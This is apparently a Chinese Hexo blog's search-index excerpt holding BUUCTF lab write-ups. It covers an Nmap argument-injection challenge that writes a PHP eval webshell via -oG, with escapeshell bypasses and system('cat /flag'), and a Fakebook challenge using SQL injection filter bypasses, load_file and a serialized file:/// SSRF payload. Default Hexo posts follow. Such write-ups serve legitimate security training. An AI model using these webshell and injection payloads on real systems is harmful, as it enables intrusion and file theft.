class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>输出:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">888<br></code></pre></td></tr></table></figure><?=(表达式)?><p>  等价于 <?php echo (表达式)?> :</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span><br><span class="hljs-string">&quot;flag&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>输出:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">flag<br></code></pre></td></tr></table></figure><p>&lt;% echo ‘123’;%&gt; :</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;%<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;flag&quot;</span>;<br>%&gt;<br></code></pre></td></tr></table></figure><p>输出：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">flag<br></code></pre></td></tr></table></figure><p>使用短标签绕过php:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">&lt;? echo &#x27;123&#x27;;?&gt;  =&gt; &lt;? echo @eval($_POST[&#x27;pass&#x27;]);?&gt;<br>&lt;?=(表达式)?&gt;  =&gt; &lt;?= @eval($_POST[&#x27;pass&#x27;]);?&gt;<br>&lt;% echo &#x27;123&#x27;;%&gt; =&gt; &lt;% echo @eval($_POST[&#x27;pass&#x27;]);%&gt;<br></code></pre></td></tr></table></figure><p>测试:</p><? echo @eval($_POST['pass']);?><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?</span> <br><span class="hljs-keyword">echo</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;dir&quot;</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>输出：</p><p><img src="/images/2023-08-22_Nmap/image-20230822125459893.png" alt="image-20230822125459893"></p><?= @eval($_POST['pass'];?><p>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;dir&quot;</span>));<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>输出结果：</p><p><img src="/images/2023-08-22_Nmap/image-20230822125704414.png" alt="image-20230822125704414"></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">&lt;?= @eval($_POST[&#x27;pass&#x27;]);?&gt;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-22_Nmap/image-20230822130015713.png" alt="image-20230822130015713"></p><p>绕过</p><p>构造写文件输出payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">&lt;?= @eval($_POST[&#x27;pass&#x27;]);?&gt; -oG pass.phtml<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-22_Nmap/image-20230822131843981.png" alt="image-20230822131843981"></p><p>发现成功绕过:<br>访问pass.phtml:</p><p>由于当于oG输出的文件都在当前文件夹下所以为:<a href="http://bd9c6623-f4d3-4f23-bf75-6978d1a50003.node4.buuoj.cn:81/pass.html">http://bd9c6623-f4d3-4f23-bf75-6978d1a50003.node4.buuoj.cn:81/pass.html</a></p><p><img src="/images/2023-08-22_Nmap/image-20230822132212701.png" alt="image-20230822132212701"></p><p>发现当前网站下没有该文件，从之前的[BUUCTF 2018]Online Tool中获取的经验，nmap可能和escapeshellarg()与escapeshellcmd()配合使用，需要绕过这两个函数：使用空格和单引号,为了防止’pass’的单引号也被这两个函数过滤，我们这里使用”pass”:<br>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">&#x27; &lt;?= @eval($_POST[&quot;pass&quot;]);?&gt; -oG pass.phtml &#x27;<br><br>&#x27; &lt;?= @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.phtml &#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-22_Nmap/image-20230822132957714.png" alt="image-20230822132957714"></p><p>访问pass.phtml:<a href="http://bd9c6623-f4d3-4f23-bf75-6978d1a50003.node4.buuoj.cn:81/pass.phtml">http://bd9c6623-f4d3-4f23-bf75-6978d1a50003.node4.buuoj.cn:81/pass.phtml</a></p><p><img src="/images/2023-08-22_Nmap/image-20230822132932341.png" alt="image-20230822132932341"></p><p>使用webshell测试:<br>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">POST:<br>pass=system(&quot;ls&quot;);<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-22_Nmap/image-20230822133218223.png" alt="image-20230822133218223"></p><p>发现一个flag文件:<br>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">POST:<br>pass=system(&quot;cat /flag&quot;);<br></code></pre></td></tr></table></figure><p>返回结果:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt"># Nmap 6.47 scan initiated Tue Aug 22 05:28:38 2023 as: nmap -Pn -T4 -F --host-timeout 1000ms -oX xml/e0e2e -oG pass.phtml \ flag&#123;544d334f-80b2-44f8-a3b1-c8b312b0b484&#125;<br> \\<br># Nmap done at Tue Aug 22 05:28:39 2023 -- 0 IP addresses (0 hosts up) scanned in 0.27 seconds<br></code></pre></td></tr></table></figure><p>flag&#x3D;flag{544d334f-80b2-44f8-a3b1-c8b312b0b484}</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF_WEB_Fakebook1 题解</title>
    <link href="/2023/08/21/2023-08-20-Fakebook1/"/>
    <url>/2023/08/21/2023-08-20-Fakebook1/</url>
    
    <content type="html"><![CDATA[<h1 id="Fakebook1"><a href="#Fakebook1" class="headerlink" title="Fakebook1"></a>Fakebook1</h1><p>1.点击登陆界面join,申请一个用户:<br>admin,123,18,bai.com</p><p>2.登录网站后，点击admin,发现网址有注入点:</p><p><a href="http://1886ff85-240c-42c7-84f0-3fa2575c0bb9.node4.buuoj.cn:81/view.php?no=1">http://1886ff85-240c-42c7-84f0-3fa2575c0bb9.node4.buuoj.cn:81/view.php?no=1</a></p><p>no,应该是记录的编号，我们可以通过no进行注入</p><p>注册一个账户之后自动生成记录的编号，所以编号为自动递增型为int</p><p>3.随便注入no&#x3D;1’,网页响应有sql报错，所以该网页存在sql语句注入</p><p>4.猜测该网页使用了select * from where no &#x3D; </p><p>所以我们可以用1 union select 1,2,3;#</p><p>但是返回了no hacker,所以可能过滤了select</p><p>所以可以用</p><p>– 内联注释绕过<br>&#x2F;*!select *&#x2F;1，2，3，4;</p><p>5.爆字段:1 order by 4;#</p><p>当order by 5#时报错，所以最大字段数为4</p><p>6.使用-1 union&#x2F;*!select *&#x2F;1，2，3，4;</p><p>只有username返回值为2，所以只有第二个字段能够成功返回值</p><p>使用-1是为了使响应网址只返回我们select的内容</p><p>7.爆数据库:-1 union&#x2F;*!select *&#x2F;1,database(),3,4;</p><p>-1 union&#x2F;*!select *&#x2F;1,group_concat(database()),3,4;&#x2F;&#x2F;爆出所有数据库</p><p>uername爆出数据库为fakebook</p><p>只有一个数据库</p><p>8.爆表</p><p>-1 union&#x2F;*!select *&#x2F;1,group_concat(table_name) ,3,4 from information_schema.tables where table_schema</p><p>&#x3D; DATABASE();&#x2F;&#x2F;database()可以直接显示当前数据库，一般是只有一个数据库才可以用，否则就要指定数据库</p><p>username字段显示users表</p><p>9.爆字段</p><p>-1 union&#x2F;*!select *&#x2F;1,group_concat(column_name),3,4  from information_schema.COLUMNS where table_schema &#x3D; ‘fakebook’ and table_name &#x3D; ‘users’;</p><p>username字段显示no,username,passwd,data字段</p><p>data字段是之前没有看到过的，所以现在要查看字段的值</p><p>10.爆字段的值</p><p>-1 union&#x2F;*!select *&#x2F;1,group_concat(data),3,4 from users</p><p>username:爆出字段值:O:8:”UserInfo”:3:{s:4:”name”;s:5:”admin”;s:3:”age”;i:13;s:4:”blog”;s:7:”bai.com”;} </p><p>这是一个序列化语句:表示有一个UserInfo类，这个类有参数name,age,blog</p><p>没有获得有用的信息，所以查看其他几个字段的内容</p><p>11.爆其他字段:</p><p>-1 union&#x2F;*!select *&#x2F;1,group_concat(no,username,passwd),3,4 from users</p><p>username爆出字段的值:1admin3c9909afec25354d551dae21590bb26e38d53f2173b8d3dc3eee4c047e7ab1c1eb8b85103e3be7ba613b31bb5c9c36214dc9f14a42fd7a2fdb84856bca5c44c2</p><p>发现除了no和username字段其他为密文，进行解密:</p><p>3c9909afec25354d551dae21590bb26e38d53f2173b8d3dc3eee4c047e7ab1c1eb8b85103e3be7ba613b31bb5c9c36214dc9f14a42fd7a2fdb84856bca5c44c2</p><p>发现解密失败，所以可能不是密文</p><p>12.查看网页的robots.txt文件，查看网页还允许我们查看的文件有哪些:</p><p><a href="http://f848876c-8f1f-4fec-bdf5-2a6496754020.node4.buuoj.cn:81/robots.txt">http://f848876c-8f1f-4fec-bdf5-2a6496754020.node4.buuoj.cn:81/robots.txt</a></p><p>获得一个user.php.bak文件，将它下载:</p><p>13.分析user.php.bak中的代码:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">//UserInfo类</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserInfo</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$age</span> = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$blog</span> = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-comment">//有参申请类</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$age</span>, <span class="hljs-variable">$blog</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;age = (<span class="hljs-keyword">int</span>)<span class="hljs-variable">$age</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;blog = <span class="hljs-variable">$blog</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>)</span><br><span class="hljs-function">    </span>&#123;<span class="hljs-comment">//curl_init()函数用于初始化一个新的会话，可以用于获取网页地址、设置网页头信息等</span><br>        <span class="hljs-variable">$ch</span> = <span class="hljs-title function_ invoke__">curl_init</span>();<br>        <span class="hljs-comment">//curl_setopt — 设置一个cURL传输选项</span><br>        <span class="hljs-comment">//CURLOPT_URL: 这是你想用PHP取回的URL地址。你也可以在用curl_init()函数初始化时设置这个选项</span><br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>);<br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br>        <br>        <span class="hljs-variable">$output</span> = <span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br>        <span class="hljs-variable">$httpCode</span> = <span class="hljs-title function_ invoke__">curl_getinfo</span>(<span class="hljs-variable">$ch</span>, CURLINFO_HTTP_CODE);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$httpCode</span> == <span class="hljs-number">404</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">404</span>;<br>        &#125;<br>        <span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$output</span>;<br>    &#125;<br>    <span class="hljs-comment">//blog内容的处理</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getBlogContents</span> (<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$this</span>-&gt;blog);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isValidBlog</span> (<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$blog</span> = <span class="hljs-variable language_">$this</span>-&gt;blog;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="hljs-variable">$blog</span>);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>该代码展示了一个UserInFo的类的具体内容和参数，以便之后的序列化处理</p><p>14.由网页显示的内容得：</p><p><strong>the contents of his&#x2F;her blog</strong></p><p><strong>下面一块不可见区域为，我们输入的blog（博客）的内容，所以猜测如果我们输入的博客内容为flag.php,则会显示该文件的内容，但是我们要知道网站flag.php的具体文件路径</strong></p><p><strong>网页中源代码的描述这块内容:</strong><br><strong>src &#x3D; ‘data:text&#x2F;html;base64,PCF………’</strong></p><p><strong>所以data的类型是text文本型</strong></p><p>所以网页的源地址传输为data,猜测可能利用的是第四个字段data中的内容:</p><p>O:8:”UserInfo”:3:{s:4:”name”;s:5:”admin”;s:3:”age”;i:13;s:4:”blog”;s:7:”bai.com”;} </p><p>data字段中的内容是经过序列化处理的结果</p><p>15.利用报错注入获取flag.php的文件路径:</p><p>or(updatexml(1,concat(‘<del>‘,(SELECT(load_file(“flag.php”)),’</del>‘),1))#</p><p>or(updatexml(1,concat(0x7e,(SELECT(database())),0x7e),1))#</p><p>通过筛选，发现网站过滤了’x’</p><p>所以用字符’<del>‘:or(updatexml(1,concat(‘</del>‘,(SELECT(load_file(“flag.php”)),’~’),1))#</p><p>返回报错内容:</p><p>[*] query error! (Incorrect parameter count in the call to native function ‘updatexml’)</p><p><strong>Fatal error</strong>:  Call to a member function fetch_assoc() on boolean in <strong>&#x2F;var&#x2F;www&#x2F;html&#x2F;db.php</strong> on line <strong>66</strong></p><p>所以我们猜测flag.php的地址为&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php</p><p><strong>其实，随便输入一个错误的参数都会报错显示地址&#x2F;var&#x2F;www&#x2F;html&#x2F;db.php，所以一定要注意任何报错信息</strong></p><p>16.所以blog&#x3D;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php</p><p>所以要爆出该文件的内容:select load_file(“文件路径”);可以获取该文件的内容</p><p>-1 union&#x2F;*!select *&#x2F;1,load_file(“&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php”),3,4</p><p><strong>username没有返回内容，但是页面产生了响应，说明username所显示的内容，不符合该字段所能显示的内容的格式，可以通过查看网页源代码，查看本来应该在该字段中显示的内容：</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs html">    <span class="hljs-tag">&lt;<span class="hljs-name">table</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;table&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span><br>                username<br>            <span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span><br>                age<br>            <span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span><br>                blog<br>            <span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span><br>                <span class="hljs-meta">&lt;?php</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$flag = &quot;flag&#123;ab61868d-16df-4976-93c7-8980c7fbc7be&#125;&quot;;</span><br><span class="hljs-meta">exit(0);</span><br><span class="hljs-meta">            &lt;/td&gt;</span><br><span class="hljs-meta">            &lt;td&gt;</span><br><span class="hljs-meta">                &lt;br /&gt;</span><br><span class="hljs-meta">&lt;b&gt;Notice&lt;/b&gt;:  Trying to get property of non-object in &lt;b&gt;/var/www/html/view.php&lt;/b&gt; on line &lt;b&gt;53&lt;/b&gt;&lt;br /&gt;</span><br><span class="hljs-meta">            &lt;/td&gt;</span><br><span class="hljs-meta">            &lt;td&gt;</span><br><span class="hljs-meta">                &lt;br /&gt;</span><br><span class="hljs-meta">&lt;b&gt;Notice&lt;/b&gt;:  Trying to get property of non-object in &lt;b&gt;/var/www/html/view.php&lt;/b&gt; on line &lt;b&gt;56&lt;/b&gt;&lt;br /&gt;</span><br><span class="hljs-meta">            &lt;/td&gt;</span><br><span class="hljs-meta">        &lt;/tr&gt;</span><br><span class="hljs-meta">    &lt;/table&gt;</span><br></code></pre></td></tr></table></figure><p>所以flag为:</p><p>flag{ab61868d-16df-4976-93c7-8980c7fbc7be}</p><p>16.如果网站过滤了load_file(“路径”):</p><p>第四个字段data所显示的位置为:the contents of his&#x2F;her blog</p><p>该字段为将存储于数据库中的如O:8:”UserInfo”:3:{s:4:”name”;s:5:”admin”;s:3:”age”;i:13;s:4:”blog”;s:7:”bai.com”;} 的内容取出，然后根据该data中blog的地址，访问出blog的内容，所以我们可以让它显示&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php的内容</p><p>假设它网页是对这个序列化的内容base-64加密然后访问，则我们也只需要让它访问序列化的data：</p><p>O:8:”UserInfo”:3:{s:4:”name”;s:5:”admin”;s:3:”age”;i:13;s:4:”blog”;s:29:”file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php”;}</p><p>payload:</p><p>-1 union&#x2F;*!select *&#x2F;1,2,3,’O:8:”UserInfo”:3:{s:4:”name”;s:5:”admin”;s:3:”age”;i:13;s:4:”blog”;s:29:”file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php”；}’:</p><p><strong>the contents of his&#x2F;her blog,没有显示内容，可能依然为非该字段的格式内容，所以查看网页源代码:</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">hr</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>the contents of his/her blog<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">hr</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&#x27;100%&#x27;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&#x27;10em&#x27;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&#x27;data:text/html;base64,PD9waHANCg0KJGZsYWcgPSAiZmxhZ3sxOTUxNDdkZi1iN2NhLTQ1NjAtYmVjYi1kOTg1OTI4NTBmYzh9IjsNCmV4aXQoMCk7DQo=&#x27;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><p>这个区域显示的内容为src所指向区域，所以点击src所指向的区域:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&quot;flag&#123;195147df-b7ca-4560-becb-d98592850fc8&#125;&quot;</span>;<br><span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure><p>得到flag.php的内容</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2023/08/21/hello-world/"/>
    <url>/2023/08/21/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>First_blog</title>
    <link href="/2023/08/21/First-blog/"/>
    <url>/2023/08/21/First-blog/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
